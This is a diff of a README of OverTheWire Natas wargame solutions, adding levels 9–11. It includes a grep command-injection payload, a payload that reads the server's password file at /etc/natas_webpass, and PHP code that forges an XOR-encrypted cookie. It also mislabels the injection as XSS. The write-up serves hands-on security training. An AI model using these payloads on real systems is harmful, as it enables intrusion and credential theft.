@@ -1,7 +1,9 @@
 # OverTheWire Natas Solutions
 
-This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems. Please use these as hints to solve them yourself (unless you're stuck).
-OverTheWire Natas is a collection of 33 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number.
+This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 33 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. <br>
+Please use these as hints to solve the challenges yourself. Do not use them to cheat and not learn...
+> "With borrowed power, you'll never walk the path of the almighty."
+<br>\- Cid Kagenou, ["The Eminence in Shadow"](https://shadow-garden.jp/), Daisuke Aizawa
 
 ## Levels
 - [Level 0](#level0)
@@ -12,7 +14,10 @@ OverTheWire Natas is a collection of 33 levels, each dealing with the basics of 
 - [Level 5](#level5)
 - [Level 6](#level6)
 - [Level 7](#level7)
-- [Level 8](#level8) 
+- [Level 8](#level8)
+- [Level 9](#level9) 
+- [Level 10](#level10)
+- [Level 11](#level11) 
 
 ### Level 0 <a name="level0"></a>
 Level 0 is pretty straight-foward. After logging into the level using the password `natas0`, we get the following screen:
@@ -175,7 +180,7 @@ The only way a site remembers something is via [cookies](https://en.wikipedia.or
 
 Not only it's stored locally, but it's part of a request header. Now, opening the Network tab in the Developer Tools[^1], and scrolling down, we see the cookie header is set to `loggedin=0`:
 
-![Cookie](/imgs/lvl5/cookie.png)
+![Cookies](/imgs/lvl5/cookies.png)
 
 Now, doing the same thing as before, we can edit and resend the header, adding another cookie header and setting it to `loggedin=1` (don't worry about deactivating the first one, only the last cookie will be executed). Doing so, gives us the raw HTML code with the solution:
 ```html
@@ -365,7 +370,7 @@ if($key != "") {
 ```
 Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an XSS attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
 Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running the `--help` flag will print out, and then exit. Exactly what we need to execute remote Shell commands on the server. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
-`--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work
+Payload: `--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work
 
 Output:
 
@@ -382,11 +387,176 @@ Landing on the site, we see this:
 
 ![Level 10](/imgs/lvl10/screenshot.png)
 
+Now we can't directly concatenate commands in the input field, since in the source code, any character in the list cannot be used:
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+So now we can't use `[ ; | & ]`. Luckly for us, the command is still `grep`, which we can abuse to spit out the contents of a file. But how can we access the `/etc/natas_webpass/natas11` if we can't move around? Well, we can just feed the path into `grep`, and he'll do the work for us. <br>
+Modifing a bit the payload, we can retrieve and display the password for the next level: <br>
+Payload: `{random character} ../../../../etc/natas_webpass/natas11 #` <br>
+Output: 
+```html
+<html>
+    <head>
+        ...
+    </head>
+    <body>
+        <h1>natas10</h1>
+        <div id="content">
+
+            For security reasons, we now filter on certain characters<br/><br/>
+            <form>
+                Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+            </form>
+
+
+            Output:
+            <pre>
+                ****
+            </pre>
+
+            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+        </div>
+    </body>
+</html>
+```
+
 ### Level 11 <a name="level11"></a>
 Landing on the site, we see this:
 
 ![Level 11](/imgs/lvl11/screenshot.png)
 
+A simple input that changes the background color to a hexadecimal value. The text above, though, is what's scary. Let's check out the source code:
+```php
+<?
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
 
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+
+...
+
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+?>
+```
+Let's take a look at the cookie that's sent to the server:
+
+![Cookie](/imgs/lvl11/cookie.png)
+
+Indeed, there's some [XOR cypher](https://en.wikipedia.org/wiki/XOR_cipher) on the cookie that's sent, where we could've edited some information about the `showpassword` field. By definition, a XOR cypher isn't exactly the most secure one:
+> The XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed. Its primary merit is that it is simple to implement, and that the XOR operation is computationally inexpensive. A simple repeating XOR (i.e. using the same key for xor operation on the whole data) cipher is therefore sometimes used for hiding information in cases where no particular security is required.
+
+Expecially when the message contains sensible information mixed in. It would be easy to reverse engineer the solution by decoding and XORing the data, but the `key` is hidden to us. We need to find what it is in order to pass the level. <br>
+We can exploit the fact that XOR is an associative operation: $\text{plaintext} ⊕ \text{key} = \text{ciphertext} \Rightarrow$ <br> $\text{ciphertext} ⊕ \text{key} = \text{plaintext} \land \text{ciphertext} ⊕ \text{plaintext} = \text{key}$. <br>
+We know the $\text{ciphertext}$ (which is our cookie), but we need the $\text{plaintext}$ in order to find the key. We can generate it by using the same code that's used to save data, naturally without the XOR function:
+```php
+<?php
+$d = array( "showpassword" => "no", "bgcolor" => "#ffffff");
+echo base64_encode(json_encode($d));
+?>
+```
+What we get is the $\text{ciphertext}=$`eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`. Using an online encoder, we can XOR the two and get the key used: <br>
+`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` $⊕$ `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=` $=$ `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq` <br>
+Since XOR repeats the key for the size of the input, we have `key =  qw8J`. Editing the code for the encryption function, we can now generate a new cookie that has `"showpassword" => "yes"`:
+```php
+<?php
+function xor_encrypt($in) {
+    $key = 'qw8J';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+$d = array( "showpassword" => "yes", "bgcolor" => "#ffffff");
+echo base64_encode(xor_encrypt(json_encode($d)));
+?>
+```
+The new cookie generated is `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`. This cookie has the option to sho the password, so when we add it to the request header like `data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`, we get the solution:
+```html
+<html>
+    <head>
+        ...
+    </head>
+
+    <h1>natas11</h1>
+    <div id="content">
+        <body style="background: #ffffff;">
+                Cookies are protected with XOR encryption<br/><br/>
+                The password for natas12 is ****
+
+                <form>
+                        Background color: <input name=bgcolor value="#ffffff">
+                        <input type=submit value="Set color">
+                </form>
+
+                <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+                </div>
+        </body>
+</html>
+```
+
+---
 [^1]: I'll be using FireFox, and some DevTools and shorcuts are different from one another, although they're mostly similar in functionality.
 [^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenge, if one doesn't want to use hints.
